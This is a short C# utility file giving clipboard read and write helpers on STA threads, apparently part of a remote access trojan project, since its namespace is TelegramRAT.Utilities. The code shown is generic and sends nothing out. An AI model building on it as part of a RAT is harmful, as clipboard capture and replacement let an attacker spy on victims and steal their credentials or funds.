using System.Threading;
using System.Windows.Forms;

namespace TelegramRAT.Utilities;

static class ClipboardUtils
{
    public static string GetText()
    {
        string result = string.Empty;
        Thread thread = new Thread(() =>
        {
            if (Clipboard.ContainsText())
            {
                result = Clipboard.GetText();
            }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
        return result;
    }

    public static void SetText(string text)
    {
        Thread thread = new Thread(() => Clipboard.SetText(text));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
    }
}
